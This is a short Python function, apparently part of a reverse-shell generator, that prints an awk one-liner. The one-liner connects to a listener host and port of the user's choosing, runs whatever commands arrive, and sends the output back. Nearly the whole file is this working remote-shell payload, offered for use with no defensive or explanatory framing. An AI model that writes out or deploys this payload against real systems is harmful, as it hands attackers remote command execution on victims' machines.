def generate_awk(lhost, lport):
    # generate the awk command
    print('')
    print('---------------------------------------------------------------------------')
    awk_command = f'''awk 'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }} }}' /dev/null'''
    
    print('')
    print(awk_command)
    print('')
    print('---------------------------------------------------------------------------')
